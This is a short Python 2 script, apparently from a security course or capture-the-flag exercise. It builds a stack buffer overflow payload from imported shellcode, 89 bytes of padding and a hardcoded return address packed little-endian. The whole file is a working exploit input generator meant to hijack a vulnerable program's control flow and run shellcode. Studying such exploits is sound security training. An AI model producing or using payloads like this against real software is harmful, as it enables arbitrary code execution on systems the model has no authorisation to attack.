from shellcode import shellcode
from struct import pack

print shellcode + '\61'*89 + pack("<I",0xbffe8e9c)
